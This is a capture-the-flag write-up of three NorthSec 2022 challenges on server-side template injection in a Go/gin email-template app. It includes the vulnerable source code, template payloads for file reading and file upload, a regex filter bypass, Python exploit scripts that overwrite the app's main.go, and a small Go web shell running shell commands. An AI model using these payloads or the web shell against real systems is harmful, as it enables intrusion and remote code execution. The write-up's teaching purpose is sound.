---
title: "[NSEC 2022] Marketing Email Template"
date: 2022-06-11
draft: false
url: /nsec2022-marketing-email-template
toc: true
tags: [ "CTF" , "NSEC" ]
---

## Introduction

During the weekend of May 21st, I participated with my team **PolyHx** in the NorthSec CTF 2022. This is a write-up about a track of 3 flags around SSTI (Server-Side Template Injection) in Go. The context is that we are auditing an application used to draft marketing emails through a template.

My team ended up being the first to complete the whole track.

## Note

The `main.go` files can be built and ran and during the CTF I was debugging locally most of the time. Need to setup a `templates/` folder containing placeholder `templates/index.html` and `templates/preview.html` beforehand.

```bash
mkdir templates
echo "Index" > templates/index.html
echo "Preview" > templates/preview.html
go build main.go
./main
```

## Level 1 - Baby Steps

Accessing the website (http://dev.email-template.ctf), we are welcomed with an application that allows us to specify a template for a marketing email which can contain variables like `{{ .title }}`. There is a link to download the source code of the application, which uses the Go language.

In this case, I approached the web application code by first looking into the exposed server routes as there were not that many.

```go {linenos=table,hl_lines=["22-24",26,27,30,"36-43",45,54,57,62,104,110,118,176,190,197],linenostart=1}
package main

import (
    "os"
    "log"
    "fmt"
    "path"
    "errors"
    "strings"

    "net/http"
    "io/ioutil"
    "html/template"

    "github.com/gin-gonic/gin"
)

type Update struct {
    Template string `json:"template" binding:"required"`
}

type MyApp struct {
    templateName string
}

func (m *MyApp) ReadFile() ([]byte, error) {
    f, err := os.Open(m.templateName)

    if err != nil {
        files, e := ioutil.ReadDir(path.Dir(m.templateName))

        if e != nil {
            return []byte{}, e
        }

        var filenames []string
        for _, file := range files {
            var filename string = file.Name()
            if file.IsDir() {
                filename += " (directory)"
            }
            filenames = append(filenames, filename)
        }

        return []byte(fmt.Sprint(err) + "\nPossible files:\n" + strings.Join(filenames[:], "\n")), nil
    }

    defer func() {
        if err = f.Close(); err != nil {
            log.Fatal(err)
        }
    }()

    return ioutil.ReadAll(f)
}

func (m *MyApp) SetTemplateName(name string) error {
    if name == "" {
        return errors.New("TemplateName cannot be nil or empty.")
    }

    m.templateName = name
    return nil
}

func main() {
    r := gin.Default()
    r.LoadHTMLGlob("templates/*")
    r.Static("/assets", "./assets")

    r.GET("/", func(c *gin.Context) {
        m := MyApp{"templates/index.html"}
        content, err := m.ReadFile()

        if err != nil {
            log.Fatal(err)
        }

        m.SetTemplateName("templates/preview.html")
        preview, err := m.ReadFile()

        if err != nil {
            log.Fatal(err)
        }

        tmpl, err := template.New("").Parse(string(content))

        if err != nil {
            log.Fatal(err)
        }

        c.Status(http.StatusOK)
        err = tmpl.Execute(c.Writer, gin.H{"title":"Test!","template":string(preview),"m":&m})

        if err != nil {
            log.Fatal(err)
        }
    })

    r.POST("/update", func(c *gin.Context) {
        var update Update
        var err error

        err = c.BindJSON(&update)

        if err != nil {
            log.Fatal(err)
        }

        f, err := os.OpenFile("templates/preview.html", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0664)

        if err != nil {
            log.Fatal(err)
        }

        defer f.Close()

        if _, err = f.WriteString(update.Template); err != nil {
            log.Fatal(err)
        }

        c.JSON(200, "ok")
    })

    r.Any("/preview", func(c *gin.Context) {
        m := MyApp{"templates/preview.html"}

        var title string
        if title = c.Query("title"); c.Query("title") == "" {
            title = "Test Email"
        }

        var eventname string
        if eventname = c.Query("eventname"); c.Query("eventname") == "" {
            eventname = "My-Event-Name"
        }

        var firstname string
        if firstname = c.Query("firstname"); c.Query("firstname") == "" {
            firstname = "John"
        }

        var lastname string
        if lastname = c.Query("lastname"); c.Query("lastname") == "" {
            lastname = "Smith"
        }

        var companyname string
        if companyname = c.Query("companyname"); c.Query("companyname") == "" {
            companyname = "Email Templating Inc."
        }

        // Fetch all custom tags
        var num string
        var stop bool = false
        var custom string
        var customs = map[string]string{}
        for i := 1; !stop; i++ {
            num = "custom"+string(i+48)
            custom = c.Query(num)

            if custom == ""{
                stop = true
                break
            }
            customs[num] = custom
        }

        // Create the response map
        var response map[string]interface{} = gin.H{
                "title":title,
                "eventname":eventname,
                "firstname":firstname,
                "lastname":lastname,
                "companyname":companyname,
                "m":&m,
            }

        // Merge the custom tags
        for key, value := range customs {
            response[key] = value
        }

        content, err := m.ReadFile()

        if err != nil {
            log.Fatal(err)
        }

        tmpl, err := template.New("").Parse(string(content))

        if err != nil {
            log.Fatal(err)
        }

        c.Status(http.StatusOK)
        err = tmpl.Execute(c.Writer, response)

        if err != nil {
            log.Fatal(err)
        }
    })

    r.Run("127.0.0.1:8000")
}
```

### GET /

This is the landing page, no user input appears to be considered here. It does use a custom struct[ure] called `MyApp` to fetch the contents of a given template.

The struct is composed of only one variable, which is the `templateName` of type `string`. In Go, there is the concept of exported variables and functions. Being exported, means programmers can refer to the respective item directly when outside the package it was declared in. To be considered as exported, variables' and functions' names have to be declared with a capital letter at the beginning.

```go
MyApp.ReadFile()   // OK, wherever.
MyApp.templateName // Illegal outside "main" package.
```

The code also declares two functions that can be called on a `MyApp` instance.

`SetTemplateName` is pretty much a setter function, to update the instance's `templateName` value.

`ReadFile` is more interesting and has suspicious functionality. It first tries to open a file using the path in the instance's `templateName`. If the file does not exist, it will list all the files and directories present in the directory where `templateName` would be. 

This route then renders the `templates/index.html` with some data (which includes the contents of file `templates/preview.html` )

### POST /update

Using the struct `Update`, the route retrieves the `template` value of the JSON object in the request's body. Then it updates the contents of the file `templates/preview.html` with that value. This means that the file and its content should now be considered a user input. No sanitization appears to be present for it.

### ANY /preview

The `Any` route used here matches all standard HTTP methods. The route gets a few query parameters from the request which will be used to fill a `response` map variable. The `response` variable will also contain `custom` variables which we will revisit later, and a `m` variable which is the `MyApp` instance used to read the templates.

The `templates/preview.html` file gets read through the `MyApp` instance and the content is parsed as a template. The template is then `Execute`d with the variable `response` as its data. The http response will contain the result of executing the template with the data. 

### The Vulnerability

I had never really heard of SSTI research or payloads in Go before. As such, I did a quick search to find existing research and found [one article by Gus Ralph](https://www.onsecurity.io/blog/go-ssti-method-research/). My main takeaway was that it is possible to call exported functions from the variables that were passed to the template. 

Thankfully in this challenge, the template is provided the `m` variable of type `MyApp` which as we saw contains two exported functions. 

We will use as reference the [documentation](https://pkg.go.dev/text/template) for `text/template`. The following excerpt looks interesting:
```
.Method [Argument...]
	The method can be alone or the last element of a chain but,
	unlike methods in the middle of a chain, it can take arguments.
	The result is the value of calling the method with the
	arguments:
		dot.Method(Argument1, etc.)
```

This means if we put in our template the following content:
```
{{ .m.SetTemplateName "fishinspace" }}
```
After evaluating this template, the `m` instance will have its `templateName` changed. Combining this with `ReadFile`, we now have a gadget to read any file with sufficient permissions. `ReadFile` returns the file's content, so it will get inserted in the render, allowing us to view it. Let's also use a variable instead of hardcoding the name, so we do not have to reupload a template everytime.
```
{{ .m.SetTemplateName .title }}
{{ .m.ReadFile }}
```

We upload this template and then preview it while making sure to use the GET query parameter `title` as our filename. We then get the flag. 
Keep in mind, if the file does not exist, the directory will be listed. This will help us enumerate a few other files later on.
```
GET /preview?title=/flag.txt
```

**FLAG-6f040fad14bea1df66d07d8ccc109924**

## Level 2 - Pass Go and Collect $(sh)

We now get access to a second website (http://dev-7fe5c15819a3af65.email-template.ctf). It is similar to the first one, code is provided again.

```go {linenos=table,hl_lines=[114],linenostart=1}
package main

import (
    "os"
    "log"

    "net/http"
    "io/ioutil"

    "github.com/gin-gonic/gin"
)

type Update struct {
    Template string `json:"template" binding:"required"`
}

func main() {
    r := gin.Default()
    r.LoadHTMLGlob("templates/*")
    r.Static("/assets", "./assets")

    r.GET("/", func(c *gin.Context) {
        f, err := os.Open("templates/preview.html")

        if err != nil {
            log.Fatal(err)
        }

        defer func() {
            if err = f.Close(); err != nil {
                log.Fatal(err)
            }
        }()
        
        content, err := ioutil.ReadAll(f)

        c.HTML(http.StatusOK, "index.html", gin.H{"title":"Test!","template":string(content),"c":c})
    })

    r.POST("/update", func(c *gin.Context) {
        var update Update
        var err error

        err = c.BindJSON(&update)

        if err != nil {
            log.Fatal(err)
        }

        f, err := os.OpenFile("templates/preview.html", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0664)

        if err != nil {
            log.Fatal(err)
        }

        defer f.Close()

        if _, err = f.WriteString(update.Template); err != nil {
            log.Fatal(err)
        }

        c.JSON(200, "ok")
    })

    r.Any("/preview", func(c *gin.Context) {
        var title string
        if title = c.Query("title"); c.Query("title") == "" {
            title = "Test Email"
        }
        
        var eventname string
        if eventname = c.Query("eventname"); c.Query("eventname") == "" {
            eventname = "My-Event-Name"
        }
        
        var firstname string
        if firstname = c.Query("firstname"); c.Query("firstname") == "" {
            firstname = "John"
        }
        
        var lastname string
        if lastname = c.Query("lastname"); c.Query("lastname") == "" {
            lastname = "Smith"
        }
        
        var companyname string
        if companyname = c.Query("companyname"); c.Query("companyname") == "" {
            companyname = "Email Templating Inc."
        }
        
        // Fetch all custom tags
        var num string
        var stop bool = false
        var custom string
        var customs = map[string]string{}
        for i := 1; !stop; i++ {
            num = "custom"+string(i+48)
            custom = c.Query(num)

            if custom == ""{
                stop = true
                break
            }
            customs[num] = custom
        }

        // Create the response map
        var response map[string]interface{} = gin.H{
                "title":title,
                "eventname":eventname,
                "firstname":firstname,
                "lastname":lastname,
                "companyname":companyname,
                "c":c,
            }

        // Merge the custom tags
        for key, value := range customs {
            response[key] = value
        }

        c.HTML(http.StatusOK, 
            "preview.html", 
            response,
        )
    })

    r.Run("127.0.0.1:8000")
}
```

This time, the `MyApp` custom struct is gone. Instead of the `m` variable, we notice the `c` variable of type  `*gin.Context` being passed to the template. This seems like our best bet, so let's check the type and its exported fields. The relevant [documentation](https://pkg.go.dev/github.com/gin-gonic/gin#Context) will be used along its [source code](https://github.com/gin-gonic/gin/blob/master/context.go).

Looking at the documentation for type `Context`, the following fields are exported (not including functions):
```go
type Context struct {
	Request *http.Request
	Writer  ResponseWriter

	Params Params

	// Keys is a key/value pair exclusively for the context of each request.
	Keys map[string]any

	// Errors is a list of errors attached to all the handlers/middlewares who used this context.
	Errors errorMsgs

	// Accepted defines a list of manually accepted formats for content negotiation.
	Accepted []string
	// contains filtered or unexported fields
}
```

Since we have access to `Context.Request`, one could also look into the exported fields of the type `http.Request`. Most of my time was spent on trying to find suitable functions in `Context` or any of its exported fields.

We are looking for any path that would allows us to read a file. A function of `Context` grabbed my attention, namely the `FileAttachment` function:

```go {linenos=table,hl_lines=[9],linenostart=1037}
// FileAttachment writes the specified file into the body stream in an efficient way
// On the client side, the file will typically be downloaded with the given filename
func (c *Context) FileAttachment(filepath, filename string) {
	if isASCII(filename) {
		c.Writer.Header().Set("Content-Disposition", `attachment; filename="`+filename+`"`)
	} else {
		c.Writer.Header().Set("Content-Disposition", `attachment; filename*=UTF-8''`+url.QueryEscape(filename))
	}
	http.ServeFile(c.Writer, c.Request, filepath)
}
```

Let's upload the following template:
```
{{ .c.FileAttachment "/flag.txt" "exfil" }}
```

Previewing our template, we see the following error in our local server's logs:
```
template: preview.html:1:5: executing "preview.html" at <.c.FileAttachment>: can't call method/function "FileAttachment" with 0 results
```

After some troubleshooting, I end up reading the crucial parts of the documentation of `text/template` regarding calling methods: 
```
The result is the value of invoking the method with dot as the
receiver, dot.Method(). Such a method must have one return value (of
any type) or two return values, the second of which is an error.
If it has two and the returned error is non-nil, execution terminates
and an error is returned to the caller as the value of Execute.
```

`FileAttachment` has no return value, thus we get an error. We need to explore more and now we know the following requirements:
1. The function must return 1 or 2 values if the second one is an `error`
2. The function must perform some "exploitable" action.
3. The function must use argument types we can provide since we cannot create arbitrary types from within a template.

### The Vulnerability 

After a lot of trial and error, one function looked interesting:

```go {linenos=table,hl_lines=[9,15],linenostart=590}
// SaveUploadedFile uploads the form file to specific dst.
func (c *Context) SaveUploadedFile(file *multipart.FileHeader, dst string) error {
	src, err := file.Open()
	if err != nil {
		return err
	}
	defer src.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, src)
	return err
}
```

`SaveUploadedFile` fills the first and second requirements as it returns one value and appears to allow arbitrary file upload. As for the third requirement, there is no way to declare a `*multipart.FileHeader` object from a template. Would there be?

Enter the `FormFile` function:

```go {linenos=table,hl_lines=[4,8,13],linenostart=569}
// FormFile returns the first file for the provided form key.
func (c *Context) FormFile(name string) (*multipart.FileHeader, error) {
	if c.Request.MultipartForm == nil {
		if err := c.Request.ParseMultipartForm(c.engine.MaxMultipartMemory); err != nil {
			return nil, err
		}
	}
	f, fh, err := c.Request.FormFile(name)
	if err != nil {
		return nil, err
	}
	f.Close()
	return fh, err
}
```

The `FormFile` function fulfills the first requirement due to returning a `*multipart.FileHeader` and an `error` as second value. It also fulfills the third requirement as we can easily pass a `string` to the function. As for the second requirement, this function fetches a named file from our multipart form request which we control the contents of. Since this returns the exact type expected by `SaveUploadedFile`, this is the perfect gadget combination to achieve arbitrary file upload!

```
{{ .c.SaveUploadedFile (.c.FormFile "fish") .title }}
```

Testing locally, it works. We preview by sending a multipart form request which contains a file with the form input name `fish` and a URL query parameter `title` containg a file path. Good thing for us that the parentheses will be considered as only the first return value and not include the error (if it is nil).

```python {linenos=table,hl_lines=[],linenostart=1}
import requests

URL = "http://dev-7fe5c15819a3af65.email-template.ctf"
payload = {
    "template": """
{{ .c.SaveUploadedFile (.c.FormFile "fish") .title }}
"""
}

files = {'fish': open("afile", "r")}

r = requests.post(URL+"/update", json=payload)
print(r.status_code)
print(r.text)

r1 = requests.post(URL+"/preview?title=/example/file.txt", files=files)
print(r.status_code)
print(r.text)
```

But... then what? This does not allow us to read files.

### The Exploitation

At this point, I could not find any other useful and usable function. We need to find a way to push this further. I did not mention it, but on the first level I explored the filesystem of the challenge server while trying to find the flag. I noticed a few things.

The root `/` directory had `/app/` which contains the challenge's code. The root also contained `/app.bk/` which appeared to be a copy/backup of `/app/`. 

Since level 1, the challenge offered the possibility of resetting the challenge due to concerns of being stuck in a restart loop. That could be done by visiting the route `/reset`. I hadn't noticed that route in the Go code, so it must be implemented in some other way. When exploring the filesystem in level 1, I found two PHP scripts which Apache pointed at when we visited `GET /reset` and `GET /source`. 

The `reset.php` script took care of replacing the `/app/` directory with a clean copy of the backup and restarting the challenge service. 

```php {linenos=table,hl_lines=[2,4,6],linenostart=1}
<?php
        system("sudo /usr/bin/systemctl stop email-template");
        system("/usr/bin/rm -rf /app/*");
        system("/usr/bin/cp -r /app.bk/* /app/");
        system("sudo /usr/bin/chown -R www-data: /app/");
        system("sudo /usr/bin/systemctl start email-template");
?>
<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta http-equiv="refresh" content="5; url='/'">
        <title>Reset</title>
</head>
<body>
        Resetting... Autoredirect after 5 seconds
</body>
</html>
```

The `source.php` script took care of showing us the contents of `main.go`. This functionality also wasnt seen in the Go code, so now it makes sense now.

My first train of thought was to try and backdoor `/app.bk/main.go` and reset so that we get setup a backdoored version of the challenge. This did not work as we did not have permissions to write in `/app.bk/`. Putting a PHP file in `/var/www/html/` was also not usable, due to the proxy only taking `reset` and `source` and I don't remember if we even had the permissions to do so.

We could try to backdoor `/app/main.go` (which we do have permissions for) but this wouldn't change the program that is already loaded in memory.

Since the start, I had experienced a few times where the server would crash and a message would appear that it is currently restarting. Usually when a Go source is compiled, it is built into an `.exe`, but I did not see one in the `/app/` directory. Another way to run Go code is through a `go run main.go` command which does not create a `.exe` file. Therefore, I made a guess that the service would perform a `go run main.go` command which would run it as it is then on every service restart.

To recap:
- We have arbitrary file upload.
- We can overwrite `/app/main.go`
- We can maybe get our modified version ran if the service restarts (without a full reset).

One way to crash the server would be to reach one of the many calls to `log.Fatal` which is described as `Fatal is equivalent to Print() followed by a call to os.Exit(1)`. The one I ended up reaching was due to an error after calling `c.BindJSON(&update)` on line 47. To reach it, all we need to do is not send a JSON payload with `template` in it. An error will occur and the `log.Fatal` will be reached, terminating the server.

In my backdoored `main.go`, I implemented a very basic web shell on the route `GET /`.

```go {linenos=table,hl_lines=[],linenostart=23}
r.GET("/", func(c *gin.Context) {
	cmd := c.DefaultQuery("fish", "id")
	out, err := exec.Command("sh", "-c", cmd).Output()
	if err != nil {
		c.String(200, fmt.Sprintf("%s\n", err))
	} else {
		c.String(200, fmt.Sprintf("%s\n", out))
	}
})
```

Here was my exploit script.

```python {linenos=table,hl_lines=[],linenostart=1}
import requests

URL = "http://dev-7fe5c15819a3af65.email-template.ctf"
payload = {
    "template": """
{{ .c.SaveUploadedFile (.c.FormFile "fish") "/app/main.go" }}
"""
}

files = {'fish': open("backdoor.go", "r")}

# Updates the preview template.
r = requests.post(URL+"/update", json=payload)
print(r.status_code)
print(r.text)

# Triggers the rendering of our template with the provided form file
r = requests.post(URL+"/preview?", files=files)
print(r.status_code)
print(r.text)

# Crashes server, which restarts the service.
r = requests.post(URL+"/update")
print(r.status_code)
print(r.text)
```

This ended up working although I was not too confident. Right after the CTF, I realized I could have looked into the definition of the service. Later, another player confirmed that the file `/etc/systemd/system/email-template.service` showed all the necessary information to be confident in this attack. Next time, I will be more careful as that service's name was mentioned in the `reset.php` script and I should have taken a look.
```
[Unit]
Description=Email Template

[Service]
Type=simple
User=www-data
Group=www-data
Restart=always
RestartSec=5s
WorkingDirectory=/app/
ExecStart=/usr/local/go/bin/go run /app/main.go

[Install]
WantedBy=multi-user.target
```

With our webshell, it is only a matter of a few commands to get the flag.

**FLAG-527afbab4c2ae6ed15d6134328b8bc05**

## Level 3 - Just a Regular Bypass

We now get access to a third website (http://dev-092f50226ea22197.email-template.ctf). It is similar to the second one, but this time with some input filters. Code is provided again.

```go {linenos=table,hl_lines=["19-52",87,"137-146",155],linenostart=1}
package main

import (
    "os"
    "log"
    "regexp"
    "strings"

    "net/http"
    "io/ioutil"

    "github.com/gin-gonic/gin"
)

type Update struct {
    Template string `json:"template" binding:"required"`
}

func filter(template string) (bool, string) {
    r1, _ := regexp.Compile(`(?i)(\x7b\x7b[^\x7d]*(["\x60\(\)=\|]|Request|Writer|Params|Handle)[^\x7d]*\x7d\x7d)`)
    r2, _ := regexp.Compile(`(?i)(\x7b\x7b[^\x7d]*(\.title|\.eventname|\.firstname|\.lastname|\.companyname|\.custom[0-9]+)[^\x7d]*\x7d\x7d)`)
    r3, _ := regexp.Compile(`(\x7b\x7b *(\.title|\.eventname|\.firstname|\.lastname|\.companyname|\.custom[0-9]+) *\x7d\x7d)`)

    // Filter everything from Context, and double quotes, equal, backtick, pipe and parenthesis to avoid bypass as well.
    i := r1.FindStringSubmatch(template)
    if len(i) > 0  {
        return false, ""
    }

    // Make sure the default variables can't be used to bypass filter.
    if strings.Contains(template, ".title")  ||
        strings.Contains(template, ".eventname") ||
        strings.Contains(template, ".firstname") ||
        strings.Contains(template, ".lastname") ||
        strings.Contains(template, ".companyname") ||
        strings.Contains(template, ".custom") {


        j := r2.FindAllString(template, -1)
        if len(j) > 0  {
            for _, v := range j {
                k := r3.FindStringSubmatch(v)
                if len(k) == 0{
                    l := r2.FindStringSubmatch(v)
                    return false, "Can only use " + l[2] + " like the following {{ " + l[2] + " }}"
                }
            }
        }
    }

    return true, ""
}

func main() {
    r := gin.Default()
    r.LoadHTMLGlob("templates/*")
    r.Static("/assets", "./assets")

    r.GET("/", func(c *gin.Context) {
        f, err := os.Open("templates/preview.html")

        if err != nil {
            log.Fatal(err)
        }

        defer func() {
            if err = f.Close(); err != nil {
                log.Fatal(err)
            }
        }()

        content, err := ioutil.ReadAll(f)

        c.HTML(http.StatusOK, "index.html", gin.H{"title":"Test!","template":string(content),"c":c})
    })

    r.POST("/update", func(c *gin.Context) {
        var update Update
        var err error

        err = c.BindJSON(&update)

        if err != nil {
            log.Fatal(err)
        }

        if b, err := filter(update.Template); !b {
            c.JSON(400, err)
        } else {
            f, err := os.OpenFile("templates/preview.html", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0664)

            if err != nil {
                log.Fatal(err)
            }

            defer f.Close()

            if _, err = f.WriteString(update.Template); err != nil {
                log.Fatal(err)
            }

            c.JSON(200, "ok")
        }
    })

    r.Any("/preview", func(c *gin.Context) {
        var title string
        if title = c.Query("title"); c.Query("title") == "" {
            title = "Test Email"
        }

        var eventname string
        if eventname = c.Query("eventname"); c.Query("eventname") == "" {
            eventname = "My-Event-Name"
        }

        var firstname string
        if firstname = c.Query("firstname"); c.Query("firstname") == "" {
            firstname = "John"
        }

        var lastname string
        if lastname = c.Query("lastname"); c.Query("lastname") == "" {
            lastname = "Smith"
        }

        var companyname string
        if companyname = c.Query("companyname"); c.Query("companyname") == "" {
            companyname = "Email Templating Inc."
        }

        // Fetch all custom tags
        var num string
        var stop bool = false
        var custom string
        var customs = map[string]string{}
        for i := 1; !stop; i++ {
            num = "custom"+string(i+48)
            custom = c.Query(num)

            if custom == ""{
                stop = true
                break
            }
            customs[num] = custom
        }

        // Create the response map
        var response map[string]interface{} = gin.H{
                "title":title,
                "eventname":eventname,
                "firstname":firstname,
                "lastname":lastname,
                "companyname":companyname,
                "c":c,
            }

        // Merge the custom tags
        for key, value := range customs {
            response[key] = value
        }

        c.HTML(http.StatusOK,
            "preview.html",
            response,
        )
    })

    r.Run("127.0.0.1:8000")
}
```

The main difference with the second level is that a `filter` function is called before updating the `templates/preview.html` file in the `POST /update` route.

Let's look at the three specific regular expressions used to check our input template.
```go {linenos=table,hl_lines=[],linenostart=20}
r1, _ := regexp.Compile(`(?i)(\x7b\x7b[^\x7d]*(["\x60\(\)=\|]|Request|Writer|Params|Handle)[^\x7d]*\x7d\x7d)`)
r2, _ := regexp.Compile(`(?i)(\x7b\x7b[^\x7d]*(\.title|\.eventname|\.firstname|\.lastname|\.companyname|\.custom[0-9]+)[^\x7d]*\x7d\x7d)`)
r3, _ := regexp.Compile(`(\x7b\x7b *(\.title|\.eventname|\.firstname|\.lastname|\.companyname|\.custom[0-9]+) *\x7d\x7d)`)
```

I like to use [Debuggex](https://www.debuggex.com/) to help me visualize some regular expressions. Here is what the first regex is checking:

{{< figure class="border" src="debuggex-r1.png" caption="Debuggex result for `r1`" resize=false >}}

If we test it with our level 2 template as input:

```
{{ .c.SaveUploadedFile (.c.FormFile "fish") "/app/main.go" }}
```

It will get matched due to the parentheses and the quotes. I quickly noticed that, after a quote or parenthesis, the regex is looking any character that is not `}`. So what if we somehow put `}` within a template action and it still stays valid? 

```
{{ .c.SaveUploadedFile (.c.FormFile "}") "/app/main.go" }}
```

Turns out, `}` is a perfectly fine form input name for the server and it does bypass the filter and the other two regexes do not even come into play as the payload does not use those variables.

**FLAG-46dd90020d9b9d1270a8ee4be745405e**

### Alternative

Early on, since level 1, I had examined the code related to `customs`
```go {linenos=table,hl_lines=[7,8],linenostart=153}
// Fetch all custom tags
var num string
var stop bool = false
var custom string
var customs = map[string]string{}
for i := 1; !stop; i++ {
    num = "custom"+string(i+48)
    custom = c.Query(num)

    if custom == ""{
        stop = true
        break
    }
    customs[num] = custom
}
```


What I noticed was the odd way it allowed us to provide consecutive custom variables. 
It starts with the first custom at "index" 1, which ends up being ASCII code 48+1, which is `custom1`. So if `custom1` exists, it will then check `custom2` (ASCII code 48+2 = "2"). It does not stop until the next `customX` is not defined. So if we define enough customs in our query parameters, we will end up with the following list:
```text {linenos=table,hl_lines=[],linenostart=49}
custom1
custom2
custom3
custom4
custom5
custom6
custom7
custom8
custom9
custom:
custom;
custom<
custom=
custom>
custom?
custom@
customA
customB
customC
```

Now, if you check the second and third regular expressions, you will notice that they only check for `.custom[0-9]+` which only accounts for the ones ending with a digit. 
Thus, another unintended solve, would be to use the following template:

```
{{ with .c.FormFile .customA }}
{{ .c.SaveUploadedFile . .customB }}
{{ end }}
```

This assumes we are not allowed the characters ``"`()=|``. That is why we use a `with` to bypass the usage of parentheses.

After a bit of research, it turns out that a `*multipart.FileHeader` contains an exported field `Filename` and in our case, it takes the filename provided by the form input. We can remove the need for a second custom.

```python {linenos=table,hl_lines=[],linenostart=1}
import requests

URL = "http://dev-092f50226ea22197.email-template.ctf"
payload = {
    "template": """
{{ with .c.FormFile .customA }}
{{ $.c.SaveUploadedFile . .Filename }}
{{ end }}
"""
}

# Form Input Name: fish
# Filename: /app/main.go
files = {'fish': ("/app/main.go", open("backdoor.go","r"))}

# Updates the preview template.
r = requests.post(URL+"/update", json=payload)
print(r.status_code)
print(r.text)

# Defines all the required custom variables and triggers the rendering of our template with the provided form file
r = requests.post(URL+"/preview?custom1=a&custom2=a&custom3=a&custom4=a&custom5=a&custom6=a&custom7=a&custom8=a&custom9=a&custom%3A=a&custom%3B=a&custom%3C=a&custom%3D=a&custom%3E=a&custom%3F=a&custom%40=a&customA=fish", files=files)
print(r.status_code)
print(r.text)

# Crashes server, which restarts the service.
r = requests.post(URL+"/update")
print(r.status_code)
print(r.text)
```

After solving the third level, the challenge author informed me that both options were unintended. Some time after the CTF, the author reached out to me to test a modified regular expression and I found that some parts of it could be bypassed due missing regex flag `(?s)`. This is due to the default configuration not matching `.` with newline characters, thus my payload was bypassing some checks with a newline (Which, in a template action, is only allowed inside a string)

The third level showcases how hard it can be to get regex right on your first try. There may be other ways to bypass the rules.

## Conclusion

It was a good learning experience to explore SSTI in Go as I did not know how it could occur. It does seem to require many conditions to be exploitable due to way templates are designed in Go, but that's the fun of CTFs to create those kind of situations!

I really enjoyed this challenge due to having to find gadgets within a known open-source library and due to getting practice auditing code which was a fun throwback to my OSWE certification.  

The challenge author shared with me that they decided to look into vulnerabilities that can happen in Go after experiencing a challenge I designed and published on [RingZer0 CTF](https://ringzer0ctf.com/) with their help. That is how this SSTI challenge came to be. If you are curious, you can try my web challenge **Lotto 8/33** on RingZer0 CTF.

Many thanks to the challenge author **Marc Olivier Bergeron** and the **NSEC team** ❤️